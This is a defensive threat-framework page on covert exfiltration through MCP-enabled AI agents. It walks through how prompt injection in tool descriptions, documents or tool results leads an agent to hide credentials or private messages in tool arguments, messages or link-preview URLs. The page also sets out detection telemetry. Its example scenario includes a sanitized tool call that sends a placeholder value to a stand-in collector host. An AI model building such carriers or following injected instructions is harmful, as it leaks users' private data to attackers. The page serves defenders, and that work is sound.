# SAF-T1910: Covert Channel Exfiltration

## Overview

- **Tactic**: Exfiltration (ATK-TA0010)
- **Technique ID**: SAF-T1910
- **Research Packet**: [research/techniques/SAF-T1910](../../research/techniques/SAF-T1910/)
- **Traceability Ledger**: [traceability-ledger.yml](../../research/techniques/SAF-T1910/traceability-ledger.yml)
- **Documentation Status**: Under Review
- **Evidence Status**: Demonstrated
- **Severity**: High
- **Severity Rationale**: Controlled MCP demonstrations and a disclosed MCP vulnerability show that credentials, private messages, contacts, or other sensitive context can cross to an unintended recipient when a host combines broad data access with insufficiently inspected egress. [Invariant tool-poisoning research](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) <!-- SAF-TRACE: claims=SAF-T1910-C019; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025,SRC-nvd-cve-2025-34072 -->
- **First Observed**: Not observed in production in the reviewed corpus through 2026-09-02; public evidence is limited to controlled demonstrations and a proof-of-concept vulnerability record. [Research coverage](../../research/techniques/SAF-T1910/source-coverage.yml) <!-- SAF-TRACE: claims=SAF-T1910-C009,SAF-T1910-C017; sources=SRC-nvd-cve-2025-34072,SRC-cisa-kev-2026-09-01,SRC-nvd-mcp-keyword-20260902,SRC-radosevich-halloran-mcp-audit-2025,SRC-invariant-whatsapp-mcp-2025-04-07 -->
- **Last Updated**: 2026-09-02

## Scope

Covert Channel Exfiltration covers an adversary causing an MCP-enabled or agentic host to place sensitive context in an apparently legitimate tool argument, application message, URL, or downstream service side effect so that the data crosses to an unintended external party while its disclosure purpose is obscured. [MCP demonstrations](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) <!-- SAF-TRACE: claims=SAF-T1910-C003; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025 -->

### In Scope

- Data embedded in an otherwise permitted MCP tool call or agent action whose apparent purpose conceals the transfer. [MCP tool-poisoning experiment](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) <!-- SAF-TRACE: claims=SAF-T1910-C003,SAF-T1910-C004; sources=SRC-invariant-tpa-2025-04-01 -->
- Cross-server flows in which one MCP source supplies sensitive context and another server or external service carries it out. [WhatsApp MCP experiments](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) <!-- SAF-TRACE: claims=SAF-T1910-C005,SAF-T1910-C007; sources=SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025 -->
- Transfers completed by a secondary service action, such as an automatic link fetch after the agent posts permitted content. [Slack MCP advisory](https://embracethered.com/blog/posts/2025/security-advisory-anthropic-slack-mcp-server-data-leakage/) <!-- SAF-TRACE: claims=SAF-T1910-C008,SAF-T1910-C010; sources=SRC-cve-34072,SRC-slack-chat-postmessage -->

### Out of Scope

- Prompt injection, poisoned tool descriptions, or retrieved malicious instructions before any selected data is placed in a carrier; those are delivery or influence mechanisms. [AgentDojo research](https://arxiv.org/abs/2406.13352) <!-- SAF-TRACE: claims=SAF-T1910-C006,SAF-T1910-C020; sources=SRC-invariant-whatsapp-mcp-2025-04-07,SRC-agentdojo-2406.13352v3 -->
- Collection that leaves data inside the authorized host context, and credential abuse or persistence after disclosure. [MCP Safety Audit](https://arxiv.org/abs/2504.03767) <!-- SAF-TRACE: claims=SAF-T1910-C007,SAF-T1910-C019; sources=SRC-radosevich-halloran-mcp-audit-2025 -->
- Direct, conspicuous export whose external destination and data-bearing purpose are apparent rather than concealed in a cover operation or secondary side effect. [ATT&CK T1048](https://attack.mitre.org/techniques/T1048/) <!-- SAF-TRACE: claims=SAF-T1910-C018; sources=SRC-mitre-attack-t1048-v1.6 -->

### Distinguishing Characteristics

The technique begins when selected data enters a covert carrier and ends when that carrier or its side effect reaches an unauthorized principal; the delivery mechanism, prior collection, and downstream use are separate behaviors. The reconciled boundaries are recorded in the [technique contract](../../research/techniques/SAF-T1910/technique-contract.yml). <!-- SAF-TRACE: claims=SAF-T1910-C003,SAF-T1910-C018; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025,SRC-mitre-attack-t1048-v1.6 -->

## Description

MCP hosts coordinate model context, authorization, consent, and isolation across one-to-one client-server connections; servers are intended to receive only necessary context, with cross-server interaction controlled by the host. [MCP Architecture](https://modelcontextprotocol.io/specification/2025-06-18/architecture) <!-- SAF-TRACE: claims=SAF-T1910-C001; sources=SRC-mcp-architecture-2025-06-18 -->

The covert channel arises when data that the host or model may legitimately read is transformed into a tool argument, message field, hyperlink, or similar cover value that appears consistent with the requested action. A malicious server may receive the argument directly, a trusted messaging tool may deliver it to an attacker-selected recipient, or a preview service may fetch a data-bearing URL. [Controlled MCP research](https://arxiv.org/abs/2504.03767) <!-- SAF-TRACE: claims=SAF-T1910-C003,SAF-T1910-C004,SAF-T1910-C005,SAF-T1910-C007,SAF-T1910-C008; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025,SRC-cve-34072,SRC-nvd-cve-2025-34072 -->

The behavior is demonstrated, not observed: the reviewed corpus contains controlled experiments and a proof-of-concept CVE, but no qualifying production incident report. Model refusal is also variable, so the technique requires successful carrier construction and transfer rather than assuming that every injected instruction will work. [Evidence coverage](../../research/techniques/SAF-T1910/source-coverage.yml) <!-- SAF-TRACE: claims=SAF-T1910-C009,SAF-T1910-C017,SAF-T1910-C020; sources=SRC-nvd-cve-2025-34072,SRC-cisa-kev-2026-09-01,SRC-nvd-mcp-keyword-20260902,SRC-radosevich-halloran-mcp-audit-2025,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-agentdojo-2406.13352v3 -->

## Attack Vectors

- **Primary Vector**: Attacker-controlled instructions in a tool description, retrieved document, or tool result cause an agent to construct a data-bearing MCP action. [Invariant and academic demonstrations](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) <!-- SAF-TRACE: claims=SAF-T1910-C004,SAF-T1910-C006,SAF-T1910-C007; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025 -->
- **Secondary Vectors**:
  - A malicious server receives sensitive content inside an inconspicuous tool argument. [Tool-poisoning experiment](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) <!-- SAF-TRACE: claims=SAF-T1910-C004; sources=SRC-invariant-tpa-2025-04-01 -->
  - A trusted messaging tool or its automatic link-preview service becomes the external carrier. [Slack MCP vulnerability](https://embracethered.com/blog/posts/2025/security-advisory-anthropic-slack-mcp-server-data-leakage/) <!-- SAF-TRACE: claims=SAF-T1910-C005,SAF-T1910-C008; sources=SRC-invariant-whatsapp-mcp-2025-04-07,SRC-cve-34072,SRC-nvd-cve-2025-34072 -->
- **Affected Components**: MCP host and model context, client-server sessions, tool descriptions, tool arguments and results, downstream application APIs, and network egress. [MCP Architecture and Tools](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) <!-- SAF-TRACE: claims=SAF-T1910-C001,SAF-T1910-C002; sources=SRC-mcp-architecture-2025-06-18,SRC-mcp-tools-2025-06-18 -->
- **Trust Boundary Crossed**: Data moves from the host's authorized context to an unintended external principal through an action that the host treats as permitted. [WhatsApp MCP demonstration](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) <!-- SAF-TRACE: claims=SAF-T1910-C003,SAF-T1910-C005; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025 -->

## Technical Details

### Prerequisites

- The agent or an available tool can read data that the attacker wants to disclose. [MCP Safety Audit](https://arxiv.org/abs/2504.03767) <!-- SAF-TRACE: claims=SAF-T1910-C007,SAF-T1910-C019; sources=SRC-radosevich-halloran-mcp-audit-2025 -->
- The agent can invoke an MCP tool or downstream service that reaches an external destination, and the relevant data flow is not blocked by policy. [Selected demonstrations](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) <!-- SAF-TRACE: claims=SAF-T1910-C003,SAF-T1910-C005,SAF-T1910-C008; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-cve-34072 -->
- Attacker-controlled instructions or state influence the carrier's destination, arguments, or content, and any approval step fails to reveal or reject the disclosure. [Tool-poisoning experiment](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) <!-- SAF-TRACE: claims=SAF-T1910-C004,SAF-T1910-C020; sources=SRC-invariant-tpa-2025-04-01,SRC-radosevich-halloran-mcp-audit-2025,SRC-agentdojo-2406.13352v3 -->

### Attack Flow

1. **Setup**: The attacker identifies a host workflow that combines sensitive context with an egress-capable MCP tool or secondary service. [Selected MCP evidence](https://arxiv.org/abs/2504.03767) <!-- SAF-TRACE: claims=SAF-T1910-C003,SAF-T1910-C007,SAF-T1910-C008; sources=SRC-invariant-tpa-2025-04-01,SRC-radosevich-halloran-mcp-audit-2025,SRC-cve-34072 -->
2. **Influence**: A poisoned description, retrieved document, or tool result supplies instructions that alter the planned tool action. [WhatsApp MCP experiments](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) <!-- SAF-TRACE: claims=SAF-T1910-C004,SAF-T1910-C006,SAF-T1910-C007; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025 -->
3. **Selection**: The agent reads or retains a sensitive value available in its authorized context. [MCP Safety Audit](https://arxiv.org/abs/2504.03767) <!-- SAF-TRACE: claims=SAF-T1910-C007; sources=SRC-radosevich-halloran-mcp-audit-2025 -->
4. **Carrier Construction**: The value is embedded in a legitimate-looking tool argument, message body, recipient, or URL. [MCP demonstrations](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) <!-- SAF-TRACE: claims=SAF-T1910-C003,SAF-T1910-C004,SAF-T1910-C005,SAF-T1910-C008; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-cve-34072 -->
5. **Boundary Crossing**: The MCP server, trusted application, or preview service delivers or fetches the carrier to an unintended external recipient. [CVE-2025-34072 disclosure](https://nvd.nist.gov/vuln/detail/CVE-2025-34072) <!-- SAF-TRACE: claims=SAF-T1910-C005,SAF-T1910-C008; sources=SRC-invariant-whatsapp-mcp-2025-04-07,SRC-nvd-cve-2025-34072,SRC-cve-34072 -->
6. **Follow-On Activity**: Any use of disclosed credentials or data is a downstream behavior and is not required to complete this technique. [MCP Safety Audit](https://arxiv.org/abs/2504.03767) <!-- SAF-TRACE: claims=SAF-T1910-C007,SAF-T1910-C019; sources=SRC-radosevich-halloran-mcp-audit-2025 -->

### Example Scenario

A sanitized scenario uses a document containing an untrusted instruction that causes an MCP-enabled summarizer to place the inert value `PROJECT-ORCHID-PLACEHOLDER` in a URL under `collector.invalid`; a messaging tool posts the link, and an automatic preview request sends the value outside the private channel. This illustrates the carrier and secondary fetch without providing a live endpoint or secret. [Slack MCP advisory](https://embracethered.com/blog/posts/2025/security-advisory-anthropic-slack-mcp-server-data-leakage/) <!-- SAF-TRACE: claims=SAF-T1910-C008,SAF-T1910-C010; sources=SRC-cve-34072,SRC-slack-chat-postmessage -->

```json
{
  "tool": "post_summary",
  "channel": "private-demo",
  "text": "Summary: https://collector.invalid/pixel?d=PROJECT-ORCHID-PLACEHOLDER"
}
```

## Evidence and Current State

### Evidence Summary

| Claim ID | Claim | Evidence Status | Source ID and Source | Limitations |
| --- | --- | --- | --- | --- |
| SAF-T1910-C001 | MCP assigns security-boundary coordination to the host. | Research-Derived | SRC-mcp-architecture-2025-06-18: [MCP Architecture](https://modelcontextprotocol.io/specification/2025-06-18/architecture) | Design responsibility does not prove implementation conformance. <!-- SAF-TRACE: claims=SAF-T1910-C001; sources=SRC-mcp-architecture-2025-06-18 --> |
| SAF-T1910-C002 | MCP tool calls expose names and arguments; clients should display and log tool use. | Research-Derived | SRC-mcp-tools-2025-06-18: [MCP Tools](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) | No universal audit schema is mandated. <!-- SAF-TRACE: claims=SAF-T1910-C002; sources=SRC-mcp-tools-2025-06-18 --> |
| SAF-T1910-C003 | Complete covert MCP-mediated transfer has been reproduced. | Demonstrated | SRC-invariant-tpa-2025-04-01; SRC-invariant-whatsapp-mcp-2025-04-07; SRC-radosevich-halloran-mcp-audit-2025 | Controlled experiments, not production incidents. <!-- SAF-TRACE: claims=SAF-T1910-C003; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025 --> |
| SAF-T1910-C004 | A poisoned tool description carried sensitive files in a hidden argument. | Demonstrated | SRC-invariant-tpa-2025-04-01: [Invariant Labs](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) | Prepared server and tested client required confirmation. <!-- SAF-TRACE: claims=SAF-T1910-C004; sources=SRC-invariant-tpa-2025-04-01 --> |
| SAF-T1910-C005 | A malicious server influenced a trusted WhatsApp send action to carry chat history. | Demonstrated | SRC-invariant-whatsapp-mcp-2025-04-07: [Invariant Labs](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) | Controlled multi-server host. <!-- SAF-TRACE: claims=SAF-T1910-C005; sources=SRC-invariant-whatsapp-mcp-2025-04-07 --> |
| SAF-T1910-C006 | Tool-output injection caused a tested agent to send recent contacts. | Demonstrated | SRC-invariant-whatsapp-mcp-2025-04-07: [Invariant Labs](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) | One adapted prompt; no universal success rate. <!-- SAF-TRACE: claims=SAF-T1910-C006; sources=SRC-invariant-whatsapp-mcp-2025-04-07 --> |
| SAF-T1910-C007 | A retrieval-triggered MCP experiment disclosed synthetic API keys through Slack. | Demonstrated | SRC-radosevich-halloran-mcp-audit-2025: [MCP Safety Audit](https://arxiv.org/abs/2504.03767) | Controlled fixtures and credentials. <!-- SAF-TRACE: claims=SAF-T1910-C007; sources=SRC-radosevich-halloran-mcp-audit-2025 --> |
| SAF-T1910-C008 | CVE-2025-34072 records covert exfiltration through Slack link unfurling. | Demonstrated | SRC-nvd-cve-2025-34072; SRC-cve-34072; SRC-vulncheck-cve-2025-34072 | Deprecated server; no victim incident documented. <!-- SAF-TRACE: claims=SAF-T1910-C008; sources=SRC-nvd-cve-2025-34072,SRC-cve-34072,SRC-vulncheck-cve-2025-34072 --> |
| SAF-T1910-C009 | Exploitation is recorded as proof-of-concept and the CVE is absent from the reviewed KEV release. | Research-Derived | SRC-nvd-cve-2025-34072; SRC-cisa-kev-2026-09-01 | KEV absence is not proof of no exploitation elsewhere. <!-- SAF-TRACE: claims=SAF-T1910-C009; sources=SRC-nvd-cve-2025-34072,SRC-cisa-kev-2026-09-01 --> |
| SAF-T1910-C010 | Slack link and media unfurling can be disabled. | Research-Derived | SRC-slack-chat-postmessage: [Slack documentation](https://docs.slack.dev/reference/methods/chat.postMessage/) | Slack-specific control. <!-- SAF-TRACE: claims=SAF-T1910-C010; sources=SRC-slack-chat-postmessage --> |
| SAF-T1910-C011 | Same-session access-to-egress fingerprint correlation is a practical analytic. | Research-Derived | SRC-mcp-tools-2025-06-18; SRC-cve-34072; SRC-mitre-attack-t1048-v1.6 | New SAF synthesis requiring nonstandardized telemetry. <!-- SAF-TRACE: claims=SAF-T1910-C011; sources=SRC-mcp-tools-2025-06-18,SRC-cve-34072,SRC-mitre-attack-t1048-v1.6 --> |
| SAF-T1910-C012 | URL and Unicode normalization support matching the tested encoded carrier. | Research-Derived | SRC-cve-34072: [Disclosure walkthrough](https://embracethered.com/blog/posts/2025/security-advisory-anthropic-slack-mcp-server-data-leakage/) | Cannot reverse unknown encryption or lossy transforms. <!-- SAF-TRACE: claims=SAF-T1910-C012; sources=SRC-cve-34072 --> |
| SAF-T1910-C013 | Encryption, obfuscation, fragmentation, and missing attribution create blind spots. | Research-Derived | SRC-invariant-tpa-2025-04-01; SRC-mitre-attack-t1048-v1.6; SRC-cve-34072 | Not an exhaustive evasion catalog. <!-- SAF-TRACE: claims=SAF-T1910-C013; sources=SRC-invariant-tpa-2025-04-01,SRC-mitre-attack-t1048-v1.6,SRC-cve-34072 --> |
| SAF-T1910-C014 | Approved external transfers and incomplete approval metadata affect false positives. | Research-Derived | SRC-slack-chat-postmessage; SRC-mitre-attack-t1048-v1.6 | Approval metadata does not prove business authorization. <!-- SAF-TRACE: claims=SAF-T1910-C014; sources=SRC-slack-chat-postmessage,SRC-mitre-attack-t1048-v1.6 --> |
| SAF-T1910-C015 | MCP recommends full input display, confirmation, result validation, and logging. | Research-Derived | SRC-mcp-tools-2025-06-18: [MCP Tools security considerations](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) | Controls do not guarantee user recognition. <!-- SAF-TRACE: claims=SAF-T1910-C015; sources=SRC-mcp-tools-2025-06-18 --> |
| SAF-T1910-C016 | Least privilege, sandboxing, DLP, filtering, and segmentation constrain channels. | Research-Derived | SRC-mcp-security-2025-11-25; SRC-mitre-attack-t1048-v1.6 | Deployment-specific and not complete prevention. <!-- SAF-TRACE: claims=SAF-T1910-C016; sources=SRC-mcp-security-2025-11-25,SRC-mitre-attack-t1048-v1.6 --> |
| SAF-T1910-C017 | No qualifying production incident was found in the reviewed corpus. | Demonstrated | SRC-nvd-mcp-keyword-20260902; SRC-cisa-kev-2026-09-01; selected primary research | Bounded corpus result only. <!-- SAF-TRACE: claims=SAF-T1910-C017; sources=SRC-nvd-mcp-keyword-20260902,SRC-cisa-kev-2026-09-01,SRC-radosevich-halloran-mcp-audit-2025,SRC-invariant-whatsapp-mcp-2025-04-07 --> |
| SAF-T1910-C018 | ATT&CK T1048 is analogous, not identical. | Research-Derived | SRC-mitre-attack-t1048-v1.6: [ATT&CK T1048](https://attack.mitre.org/techniques/T1048/) | Not MCP-specific and does not require a covert application carrier. <!-- SAF-TRACE: claims=SAF-T1910-C018; sources=SRC-mitre-attack-t1048-v1.6 --> |
| SAF-T1910-C019 | Confidentiality can be high; other impact depends on conditions. | Demonstrated | Selected demonstrations and CVE record | Data access, permissions, and successful transfer bound impact. <!-- SAF-TRACE: claims=SAF-T1910-C019; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025,SRC-nvd-cve-2025-34072 --> |
| SAF-T1910-C020 | Model refusal and injection defenses have variable outcomes. | Research-Derived | SRC-radosevich-halloran-mcp-audit-2025; SRC-agentdojo-2406.13352v3 | Model- and setup-specific evaluations. <!-- SAF-TRACE: claims=SAF-T1910-C020; sources=SRC-radosevich-halloran-mcp-audit-2025,SRC-agentdojo-2406.13352v3 --> |

### Current State

- **Affected Environments**: MCP or agentic hosts that combine access to sensitive context with tools or downstream services capable of reaching external recipients. [MCP demonstrations](https://arxiv.org/abs/2504.03767) <!-- SAF-TRACE: claims=SAF-T1910-C003,SAF-T1910-C007,SAF-T1910-C019; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025 -->
- **Known Exploitation**: No production incident was identified; CVE-2025-34072 is recorded as proof-of-concept and three other selected examples are controlled demonstrations. [NVD CVE record](https://nvd.nist.gov/vuln/detail/CVE-2025-34072) <!-- SAF-TRACE: claims=SAF-T1910-C009,SAF-T1910-C017; sources=SRC-nvd-cve-2025-34072,SRC-cisa-kev-2026-09-01,SRC-nvd-mcp-keyword-20260902,SRC-radosevich-halloran-mcp-audit-2025,SRC-invariant-whatsapp-mcp-2025-04-07 -->
- **Available Protections**: Show complete tool inputs, log calls, restrict data and network access, enforce destination policy, and disable automatic link unfurling where it is not required. [MCP Tools security considerations](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) <!-- SAF-TRACE: claims=SAF-T1910-C010,SAF-T1910-C015,SAF-T1910-C016; sources=SRC-slack-chat-postmessage,SRC-mcp-tools-2025-06-18,SRC-mcp-security-2025-11-25,SRC-mitre-attack-t1048-v1.6 -->
- **Residual Risk**: Model refusals vary, and encrypted, transformed, or unattributed secondary traffic can evade content correlation. [MCP Safety Audit](https://arxiv.org/abs/2504.03767) <!-- SAF-TRACE: claims=SAF-T1910-C013,SAF-T1910-C020; sources=SRC-invariant-tpa-2025-04-01,SRC-mitre-attack-t1048-v1.6,SRC-cve-34072,SRC-radosevich-halloran-mcp-audit-2025,SRC-agentdojo-2406.13352v3 -->

### Known Breaches and Vulnerabilities

| Event or Identifier | Date and Environment | Impact and Remediation | Relationship to This Technique | Evidence Limitation |
| --- | --- | --- | --- | --- |
| CVE-2025-34072 | Published 2025-07-02; default deployments of the deprecated Anthropic Slack MCP Server | A data-bearing link could be fetched by Slack preview services; remove the server or disable link and media unfurling. | Direct vulnerability; selected secondary-fetch carrier. | Proof-of-concept only, absent from CISA KEV 2026.09.01, and no production victim documented. <!-- SAF-TRACE: claims=SAF-T1910-C008,SAF-T1910-C009,SAF-T1910-C010; sources=SRC-nvd-cve-2025-34072,SRC-cve-34072,SRC-vulncheck-cve-2025-34072,SRC-cisa-kev-2026-09-01,SRC-slack-chat-postmessage --> |
| Invariant Tool Poisoning Experiment 1 | 2025-04-01; Cursor with a prepared malicious MCP tool | Test configuration and key files were carried in a hidden argument; display full descriptions and inputs and pin tool definitions. | Direct demonstration; selected hidden-argument carrier. | Controlled setup with a confirmation step, not a breach. <!-- SAF-TRACE: claims=SAF-T1910-C004,SAF-T1910-C015; sources=SRC-invariant-tpa-2025-04-01,SRC-mcp-tools-2025-06-18 --> |
| Invariant WhatsApp MCP Experiments | 2025-04-07; Cursor or Claude Desktop with WhatsApp MCP and malicious description or message | Chat history or recent contacts were sent through a trusted messaging tool; isolate servers and restrict recipients and data flow. | Direct demonstration; selected cross-server and tool-output carriers. | Controlled experiments with context-dependent prompts, not production exploitation. <!-- SAF-TRACE: claims=SAF-T1910-C005,SAF-T1910-C006,SAF-T1910-C020; sources=SRC-invariant-whatsapp-mcp-2025-04-07,SRC-agentdojo-2406.13352v3 --> |
| RADE credential-theft experiment | 2025-04-11 v2; Claude Desktop 0.8.1 with Chroma, Everything, Filesystem, and Slack MCP servers | Synthetic API-key values were found and posted to Slack; restrict sensitive access and monitor the complete sequence. | Direct demonstration; selected retrieval-triggered multi-MCP carrier. | Controlled fixtures; tested guardrails also refused some alternate prompts. <!-- SAF-TRACE: claims=SAF-T1910-C007,SAF-T1910-C020; sources=SRC-radosevich-halloran-mcp-audit-2025 --> |

## Impact Assessment

| Dimension | Rating | Rationale and Conditions |
| --- | --- | --- |
| Confidentiality | High | Credentials, chat history, contacts, and private messages were disclosed in controlled examples; actual impact requires access to comparable data and completed egress. <!-- SAF-TRACE: claims=SAF-T1910-C019; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025,SRC-nvd-cve-2025-34072 --> |
| Integrity | Low | Some demonstrated carriers altered recipients or message contents, but integrity change is conditional and not the defining objective. <!-- SAF-TRACE: claims=SAF-T1910-C005,SAF-T1910-C019; sources=SRC-invariant-whatsapp-mcp-2025-04-07,SRC-invariant-tpa-2025-04-01 --> |
| Availability | None | The immediate objective is disclosure; availability effects are outside this technique contract. <!-- SAF-TRACE: claims=SAF-T1910-C019; sources=SRC-nvd-cve-2025-34072,SRC-radosevich-halloran-mcp-audit-2025 --> |
| Scope | Multi-System | A host may combine sensitive data from one server with egress through another server or downstream service, but permissions and isolation limit reach. <!-- SAF-TRACE: claims=SAF-T1910-C001,SAF-T1910-C005,SAF-T1910-C007; sources=SRC-mcp-architecture-2025-06-18,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025 --> |

### Severity Conditions

- **Severity increases when**: The host exposes credentials or broad private context, multiple servers share model context, tools run without meaningful review, or downstream services make automatic external requests. [Selected evidence](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) <!-- SAF-TRACE: claims=SAF-T1910-C008,SAF-T1910-C019; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025,SRC-cve-34072 -->
- **Severity decreases when**: Sensitive access is minimized, destinations and full payloads are approved, egress is restricted, and automatic unfurling is disabled. [MCP security guidance](https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices) <!-- SAF-TRACE: claims=SAF-T1910-C010,SAF-T1910-C015,SAF-T1910-C016; sources=SRC-slack-chat-postmessage,SRC-mcp-tools-2025-06-18,SRC-mcp-security-2025-11-25,SRC-mitre-attack-t1048-v1.6 -->

## Detection Methods

### Required Telemetry

| Source | Events or Actions | Required Fields | Collection Notes |
| --- | --- | --- | --- |
| MCP host or client audit log | Sensitive reads and `tools/call` actions | Timestamp, session, server, tool name, complete arguments, result, approval ID and outcome | Preserve full inputs securely and join them to data provenance within the analytic window. <!-- SAF-TRACE: claims=SAF-T1910-C002,SAF-T1910-C011,SAF-T1910-C015; sources=SRC-mcp-tools-2025-06-18,SRC-cve-34072,SRC-mitre-attack-t1048-v1.6 --> |
| Network or downstream application log | HTTP, DNS, message-posting, and automatic preview requests | Timestamp, initiating session or process, destination, URL or body representation, trust class, and approval state | Attribute secondary service requests where possible and protect sensitive log content. <!-- SAF-TRACE: claims=SAF-T1910-C008,SAF-T1910-C011,SAF-T1910-C013; sources=SRC-cve-34072,SRC-mitre-attack-t1048-v1.6,SRC-invariant-tpa-2025-04-01 --> |

### Indicators of Compromise (IoCs)

- No durable attacker infrastructure is common to the selected evidence; use behavioral correlation rather than a fixed IoC list. [Selected examples](../../research/techniques/SAF-T1910/source-coverage.yml) <!-- SAF-TRACE: claims=SAF-T1910-C011,SAF-T1910-C013; sources=SRC-mcp-tools-2025-06-18,SRC-cve-34072,SRC-mitre-attack-t1048-v1.6,SRC-invariant-tpa-2025-04-01 -->

### Behavioral Indicators

- A sensitive-data access is followed in the same agent session by an unapproved external tool call or network request whose decoded payload contains a fingerprint of the accessed value. [Detection rationale](https://embracethered.com/blog/posts/2025/security-advisory-anthropic-slack-mcp-server-data-leakage/) <!-- SAF-TRACE: claims=SAF-T1910-C011,SAF-T1910-C012; sources=SRC-mcp-tools-2025-06-18,SRC-cve-34072,SRC-mitre-attack-t1048-v1.6 -->
- A trusted messaging action carries an unexpected recipient, unusually long hidden field, or data-bearing external URL inconsistent with the user's approved destination. [Invariant WhatsApp research](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) <!-- SAF-TRACE: claims=SAF-T1910-C004,SAF-T1910-C005,SAF-T1910-C008; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-cve-34072 -->
- Confidence increases when host audit, data provenance, tool arguments, and downstream network telemetry agree on the same session and data fingerprint. [Analytic evidence](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) <!-- SAF-TRACE: claims=SAF-T1910-C002,SAF-T1910-C011; sources=SRC-mcp-tools-2025-06-18,SRC-cve-34072,SRC-mitre-attack-t1048-v1.6 -->

### Detection Analytic

The standalone experimental analytic is maintained in [detection-rule.yml](detection-rule.yml).

- **Analytic Goal**: Detect access-to-egress sequences in which a sensitive fingerprint appears in an unapproved external payload. [Analytic design](detection-rule.yml)
- **Rule Status**: Experimental; the fields are a normalized defensive schema, not a protocol-mandated event format. [Analytic design](detection-rule.yml)
- **Detection Logic**: Join a sensitive read to a later external `mcp.tool_call` or `network.http_request` in the same session, normalize the payload, and alert on fingerprint containment when destination approval is false. [Analytic design](detection-rule.yml)
- **Correlation Window**: Five minutes, inclusive at 300 seconds; this is an explicit tuning assumption exercised by boundary tests. [Detection tests](test_detection_rule.py)
- **Known False Positives**: Legitimate sensitive transfers can alert when approval metadata is absent; DLP validation using synthetic canaries is an expected lookalike. [Test corpus](test-logs.json)
- **Known Limitations**: Unknown encryption, hashing, fragmentation, missing full arguments, and unattributed secondary requests can evade the analytic. [ATT&CK T1048](https://attack.mitre.org/techniques/T1048/) <!-- SAF-TRACE: claims=SAF-T1910-C013; sources=SRC-invariant-tpa-2025-04-01,SRC-mitre-attack-t1048-v1.6,SRC-cve-34072 -->
- **Tuning Guidance**: Populate destination trust and approval from policy, use privacy-preserving fingerprints, baseline approved workflows, and shorten or lengthen the window from measured session duration. [Detection rationale](https://attack.mitre.org/techniques/T1048/) <!-- SAF-TRACE: claims=SAF-T1910-C011,SAF-T1910-C014; sources=SRC-mcp-tools-2025-06-18,SRC-cve-34072,SRC-mitre-attack-t1048-v1.6,SRC-slack-chat-postmessage -->

### Validation

- **Test Data**: [test-logs.json](test-logs.json)
- **Validation Script**: [test_detection_rule.py](test_detection_rule.py)
- **Expected Result**: Nine cases pass, covering positive, negative, exact and outside-window boundaries, malformed events, iterative URL decoding, and an expected false positive. [Quality review](../../research/techniques/SAF-T1910/quality-review.yml)
- **Last Validated**: 2026-09-02. [Quality review](../../research/techniques/SAF-T1910/quality-review.yml)
- **Validation Proof**: [Detector transcript](../../research/techniques/SAF-T1910/validation/detection-test.txt) and [strict-validator transcript](../../research/techniques/SAF-T1910/validation/strict-validator.txt).
- **Feasibility Waiver**: None. [Technique contract](../../research/techniques/SAF-T1910/technique-contract.yml)

## Mitigation Strategies

### Preventive Controls

